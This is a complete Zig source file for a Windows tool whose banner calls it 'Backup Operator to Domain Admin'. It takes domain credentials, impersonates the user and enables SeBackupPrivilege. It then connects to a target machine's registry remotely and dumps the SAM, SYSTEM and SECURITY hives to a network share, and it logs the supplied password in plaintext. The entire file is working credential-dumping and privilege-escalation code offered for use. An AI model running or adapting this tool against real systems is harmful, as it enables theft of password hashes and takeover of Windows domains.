const win32 = @import("win32").everything;
const win32_security = @import("win32").security;
const std = @import("std");

// set log level by build type
pub const default_level: std.Level = switch (std.builtin.mode) {
    .Debug => .debug,
    .ReleaseSafe, .ReleaseFast, .ReleaseSmall => .info,
};

const windows = std.os.windows;
const kernel32 = windows.kernel32;

const REG_OPTION_BACKUP_RESTORE = 0x00000004;
const REG_OPTION_OPEN_LINK = 0x00000008;

extern "kernel32" fn GetLastError() callconv(windows.WINAPI) windows.DWORD;

// This exists until zigwin32 is updated to enable bitmasks for DesiredAccess /-:
extern "advapi32" fn OpenProcessToken(
    ProcessHandle: ?win32.HANDLE,
    DesiredAccess: u32,
    TokenHandle: ?*?win32.HANDLE,
) callconv(windows.WINAPI) win32.BOOL;

fn getUserChoice(absolute_path: []const u8) bool {
    const stdout = std.io.getStdOut().writer();
    stdout.print("\nFile ({s}) already exists - remove? (y/N): ", .{absolute_path}) catch undefined;

    var input: [8]u8 = undefined;
    _ = std.io.getStdIn().read(&input) catch undefined;

    return std.mem.eql(u8, input[0..1], "y");
}

pub fn fileExists(absolute_path: []const u8) bool {
    var file = std.fs.openFileAbsolute(absolute_path, .{}) catch |err| {
        if (err == error.FileNotFound) return false;
        return false;
    };
    defer file.close();

    return true;
}

const Target = struct {
    const Self = @This();

    force: bool,
    domain: []u8,
    username: []u8,
    password: []u8,
    source: ?[]u8,
    destination: []u8,
    token: ?win32.HANDLE,
    allocator: std.mem.Allocator,

    pub fn init(allocator: std.mem.Allocator) !Self {
        return Self{
            .force = false,
            .domain = "",
            .username = "",
            .password = "",
            .source = "",
            .destination = "",
            .token = undefined,
            .allocator = allocator,
        };
    }

    pub fn authenticate(self: *Self) bool {
        // b/c zig is different and we need a cstr (null terminated)
        const domain = std.fmt.allocPrintZ(self.allocator, "{s}", .{self.domain}) catch undefined;
        const username = std.fmt.allocPrintZ(self.allocator, "{s}", .{self.username}) catch undefined;
        const password = std.fmt.allocPrintZ(self.allocator, "{s}", .{self.password}) catch undefined;

        defer self.allocator.free(domain);
        defer self.allocator.free(username);
        defer self.allocator.free(password);

        std.log.debug("[+] Attempting LogonUserA({s}, {s}, {s})", .{ username, domain, password });
        // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonusera
        if (0 == win32.LogonUserA(
            username, //                                    [in]           LPCSTR  lpszUsername,
            domain, //                                      [in, optional] LPCSTR  lpszDomain,
            password, //                                    [in, optional] LPCSTR  lpszPassword,
            win32.LOGON32_LOGON_NEW_CREDENTIALS, //         [in]           DWORD   dwLogonType,
            win32.LOGON32_PROVIDER_WINNT50, //              [in]           DWORD   dwLogonProvider,
            &self.token, //                                 [out]          PHANDLE phToken

        )) {
            std.log.err("[!] Failed LogonUserA {s}\\{s}:{s} :: error code ({d})", .{ domain, username, password, GetLastError() });
            return false;
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser
        if (0 == win32.ImpersonateLoggedOnUser(
            self.token, // [in] HANDLE hToken
        )) {
            std.log.err("[!] Failed ImpersonateLoggedOnUser :: error code ({d})", .{GetLastError()});
            return false;
        }

        return true;
    }

    pub fn tryEnableSeBackupPrivilege(self: *Self) bool {
        // <<<
        //  TODO:
        //  does this work or should the following instead?
        //  https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupaccountnamea
        //  https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-checktokenmembership
        // >>>
        var tp: win32.TOKEN_PRIVILEGES = undefined;
        var luid: win32.LUID = undefined;

        // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluea
        if (0 == win32.LookupPrivilegeValueA(
            @ptrFromInt(0), //          [in, optional] LPCSTR lpSystemName,
            win32.SE_BACKUP_NAME, //    [in]           LPCSTR lpName,
            &luid, //                   [out]          PLUID  lpLuid
        )) {
            std.log.err("[!] Failed LookupPrivilegeValueA :: error code ({d})", .{GetLastError()});
            return false;
        }

        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = win32.SE_PRIVILEGE_ENABLED;

        var token: ?win32.HANDLE = self.token;

        if (token == undefined or token.? == win32.INVALID_HANDLE_VALUE) {
            // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess
            const hProcess: ?win32.HANDLE = win32.GetCurrentProcess();
            const ap: u32 = @bitCast(win32_security.TOKEN_ADJUST_PRIVILEGES);
            const q: u32 = @bitCast(win32_security.TOKEN_QUERY);

            // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
            if (0 == OpenProcessToken(
                hProcess.?, //                                                                                              [in]  HANDLE  ProcessHandle,
                ap | q, //   [in]  DWORD   DesiredAccess,
                &token, //                                                                                                  [out] PHANDLE TokenHandle
            )) {
                std.log.err("[!] Failed OpenProcessToken :: error code ({d})", .{GetLastError()});
                return false;
            }
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
        if (0 == win32.AdjustTokenPrivileges(
            token, //                           [in]            HANDLE            TokenHandle,
            0, //                               [in]            BOOL              DisableAllPrivileges,
            &tp, //                             [in, optional]  PTOKEN_PRIVILEGES NewState,
            @sizeOf(win32.TOKEN_PRIVILEGES), // [in]            DWORD             BufferLength,
            @ptrFromInt(0), //                  [out, optional] PTOKEN_PRIVILEGES PreviousState,
            @ptrFromInt(0), //                  [out, optional] PDWORD            ReturnLength
        )) {
            const result = GetLastError();
            if (result == @intFromEnum(win32.WIN32_ERROR.ERROR_INVALID_HANDLE)) {
                std.log.err("[!] Failed AdjustTokenPrivileges - invalid handle :: error code ({d})", .{result});
            } else {
                std.log.err("[!] Failed AdjustTokenPrivileges:: error code ({d})", .{result});
            }

            return false;
        }

        const result = GetLastError();
        if (result != 0) { // win32.WIN32_ERROR.ERROR_SUCCESS

            if (result == 1300) { // win32.WIN32_ERROR.ERROR_NOT_ALL_ASSIGNED
                std.log.err("[!] Failed to assign privilege :: error code ({d})", .{result});
            } else {
                std.log.err("[!] Failed to enable SeBackupPrivilege :: error code ({d})", .{result});
            }

            return false;
        }

        return true;
    }

    pub fn save(self: *Self) bool {
        var ret: bool = true;
        var local_machine: ?win32.HKEY = undefined;
        var hive_key: ?win32.HKEY = undefined;
        var result: win32.WIN32_ERROR = win32.WIN32_ERROR.NO_ERROR;

        const hives = [_][]const u8{ "SAM", "SYSTEM", "SECURITY" };

        const source = std.fmt.allocPrintZ(self.allocator, "\\\\{s}", .{self.source.?}) catch return false;
        defer self.allocator.free(source);

        // https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regconnectregistrya
        std.log.debug("[+] Calling RegConnectRegistryA({s}, HKLM, hKey)", .{source});
        result = win32.RegConnectRegistryA(
            if (self.source.?.len > 0) source else @ptrFromInt(0), //    [in, optional] LPCSTR lpMachineName,
            win32.HKEY_LOCAL_MACHINE, //                                                                [in]           HKEY   hKey,
            &local_machine, //                                                                          [out]          PHKEY  phkResult
        );
        if (result != win32.WIN32_ERROR.NO_ERROR) {
            if (@intFromEnum(result) == @intFromEnum(win32.RPC_STATUS.RPC_S_INVALID_NET_ADDR)) {
                std.log.err("[!] Failed RegConnectRegistryA - Unable to connect {s} :: error code ({d})", .{ source, @intFromEnum(result) });
            } else {
                std.log.err("[!] Failed RegConnectRegistryA :: error code ({d})", .{@intFromEnum(result)});
            }
            return false;
        }

        for (hives) |h| {
            std.log.info("[+] Saving {s} hive to {s}\\{s}", .{ h, self.destination, h });

            const hive = std.fmt.allocPrintZ(self.allocator, "{s}", .{h}) catch undefined;
            defer self.allocator.free(hive);

            std.log.debug("[+] Calling RegOpenKeyExA(HKLM, {s}, BACKUP|LINK, ALL_ACCESS, hKey)", .{hive});
            // https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa
            result = win32.RegOpenKeyExA(
                local_machine, //                                   [in]           HKEY   hKey,
                hive, //                                            [in, optional] LPCSTR lpSubKey,
                REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, //[in]           DWORD  ulOptions,
                win32.KEY_READ, //                                  [in]           REGSAM samDesired,
                &hive_key, //                                       [out]          PHKEY  phkResult
            );

            if (result != win32.WIN32_ERROR.NO_ERROR) { // ERROR_SUCCESS == NO_ERROR
                if (result == win32.WIN32_ERROR.ERROR_ACCESS_DENIED) {
                    std.log.err("[!] Access Denied for key {s} :: error code ({d})", .{ hive, @intFromEnum(result) });
                } else if (result == win32.WIN32_ERROR.ERROR_FILE_NOT_FOUND) {
                    std.log.err("[!] File not found {s} :: error code ({d})", .{ hive, @intFromEnum(result) });
                } else {
                    std.log.err("[!] Failed RegOpenKeyExA :: error code ({d})", .{@intFromEnum(result)});
                }

                ret = false;

                break;
            }

            const destination = std.fmt.allocPrintZ(self.allocator, "{s}\\{s}", .{ self.destination, hive }) catch undefined;
            defer self.allocator.free(destination);

            if (fileExists(destination)) {
                if (self.force or getUserChoice(destination)) {
                    std.fs.deleteFileAbsolute(destination) catch {
                        std.log.err("Failed to delete: {s}\n", .{destination});
                        ret = false;
                    };
                } else {
                    ret = false;
                }
            }

            if (ret) {
                std.log.debug("[+] Calling RegSaveKeyA(hKey, {s}, null)", .{destination});
                // https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsavekeya
                result = win32.RegSaveKeyA(
                    hive_key.?, //      [in]           HKEY                        hKey,
                    @as([*:0]const u8, destination), //     [in]           LPCSTR                      lpFile,
                    @ptrFromInt(0), //  [in, optional] const LPSECURITY_ATTRIBUTES lpSecurityAttributes
                );
                if (result != win32.WIN32_ERROR.NO_ERROR) {
                    if (result == win32.WIN32_ERROR.ERROR_INVALID_PARAMETER) {
                        std.log.err("[!] Failed RegSaveKeyA - Bad parameter :: error code ({d})", .{@intFromEnum(result)});
                    } else if (result == win32.WIN32_ERROR.ERROR_ALREADY_EXISTS) {
                        std.log.err("[!] Failed RegSaveKeyA - Cannot create a new file when that file already exists :: error code ({d})", .{@intFromEnum(result)});
                    } else if (result == win32.WIN32_ERROR.ERROR_ACCESS_DENIED) {
                        std.log.err("[!] Failed RegSaveKeyA - access denied :: error code ({d})", .{@intFromEnum(result)});
                        std.fs.deleteFileAbsolute(destination) catch undefined;
                    } else {
                        std.log.err("[!] Failed RegSaveKeyA :: error code ({d})", .{@intFromEnum(result)});
                    }

                    ret = false;
                }
            }

            // https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey
            result = win32.RegCloseKey(
                hive_key, // [in] HKEY hKey
            );
            if (result != win32.WIN32_ERROR.NO_ERROR) {
                std.log.err("[!] Failed RegCloseKey :: error code ({d}) on {s}", .{ @intFromEnum(result), hive });
                break;
            }

            if (!ret) {
                break;
            }
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey
        result = win32.RegCloseKey(
            local_machine, // [in] HKEY hKey
        );
        if (result != win32.WIN32_ERROR.NO_ERROR) {
            std.log.err("[!] Failed RegCloseKey :: error code ({d}) on HKLM", .{@intFromEnum(result)});
        }

        return ret;
    }

    pub fn debug(self: *Self) void {
        std.log.debug(
            "\nDOMAIN:\t\t{s}\nUSERNAME:\t{s}\nPASSWORD:\t{s}\nSOURCE:\t\t{s}\nDESTINATION:\t{s}",
            .{ self.domain, self.username, self.password, self.source.?, self.destination },
        );
    }

    pub fn parseTarget(self: *Self, line: []u8) !void {
        const hasDomain = std.mem.containsAtLeast(u8, line, 1, "/");
        const hasPassword = std.mem.containsAtLeast(u8, line, 1, ":");
        const hasTarget = std.mem.containsAtLeast(u8, line, 1, "@");

        if (!hasDomain and !hasPassword and !hasTarget) {
            self.source = try self.allocator.alloc(u8, line.len);
            std.mem.copyForwards(u8, self.source.?, line);
            return;
        }

        var dit = std.mem.tokenizeSequence(u8, line, "/");
        var tmp: []const u8 = dit.next() orelse return;

        if (hasDomain) {
            self.domain = try self.allocator.alloc(u8, tmp.len);
            std.mem.copyForwards(u8, self.domain, tmp);
            tmp = dit.next() orelse return;
        } else {
            self.domain = try self.allocator.alloc(u8, 1);
            self.domain[0] = '.'; //  If this parameter is ".", the function (LogonUserA) validates the account by using only the local account database.
        }

        dit = std.mem.tokenizeSequence(u8, tmp, ":");

        tmp = dit.next() orelse return;

        if (tmp.len > 0) {
            self.username = try self.allocator.alloc(u8, tmp.len);
            std.mem.copyForwards(u8, self.username, tmp);
        }

        tmp = dit.next() orelse return;

        dit = std.mem.tokenizeSequence(u8, tmp, "@");
        tmp = dit.next() orelse return;

        if (tmp.len > 0) {
            self.password = try self.allocator.alloc(u8, tmp.len);
            std.mem.copyForwards(u8, self.password, tmp);
        }

        tmp = dit.next() orelse return;

        if (tmp.len > 0) {
            self.source = try self.allocator.alloc(u8, tmp.len);
            std.mem.copyForwards(u8, self.source.?, tmp);
        }
    }

    pub fn parseShare(self: *Self, line: []u8) !void {
        self.destination = try self.allocator.alloc(u8, line.len);

        if (line.len > 0) {
            std.mem.copyForwards(u8, self.destination, line);
        }
    }

    pub fn parseForce(self: *Self, line: []u8) !void {
        self.force = std.mem.containsAtLeast(u8, line, 1, "f") or std.mem.containsAtLeast(u8, line, 1, "F");
    }

    pub fn deinit(self: *Self) void {
        self.allocator.free(self.domain);
        self.allocator.free(self.username);
        self.allocator.free(self.password);
        self.allocator.free(self.source.?);
        self.allocator.free(self.destination);

        //self.CloseHandle();
    }

    pub fn CloseHandle(self: *Self) void {
        if (self.token != null and self.token.? != win32.INVALID_HANDLE_VALUE) {
            // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself
            _ = win32.RevertToSelf();

            // https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle
            _ = win32.CloseHandle(self.token.?);
        }
    }
};

pub fn usage(argv: []u8) !void {
    const stdout = std.io.getStdOut().writer();

    try stdout.print(
        \\Backup Operator to Domain Admin (by @ArchiMoebius)
        \\
        \\  This tool exist thanks to https://github.com/Wh04m1001 && https://github.com/mpgn
        \\
        \\Usage:
        \\   <SOURCE> <DESTINATION> (F)orce
        \\
        \\Example:
        \\ .\\{s} domain/username:password@ip fqdn\\share F
    , .{argv});

    std.posix.exit(0);
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    const allocator = gpa.allocator();
    defer _ = gpa.deinit();

    // Parse args into string array (error union needs 'try')
    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    if (args.len != 3 and args.len != 4) {
        try usage(args[0]);
    }

    var target = try Target.init(allocator);
    defer target.deinit();

    var i: u8 = 0;

    for (args) |arg| {
        if (i == 1) {
            try target.parseTarget(arg);
        }

        if (i == 2) {
            try target.parseShare(arg);
        }

        if (i == 3) {
            try target.parseForce(arg);
        }

        i += 1;
    }

    target.debug();

    if (target.username.len > 0 and target.password.len > 0) {
        if (!target.authenticate()) {
            std.log.err("[!] Failed authentication", .{});
            return;
        }

        std.log.info("[+] Authenticated", .{});
    }

    if (!target.tryEnableSeBackupPrivilege()) {
        std.log.err("[!] User does not posses SeBackupPrivilege", .{});
        return;
    }

    std.log.info("[+] Privileges Verified and Enabled", .{});

    if (!target.save()) {
        std.log.err("[!] Failed registry save", .{});
        return;
    }

    std.log.info("[+] Exported!", .{});

    std.posix.exit(0);
}
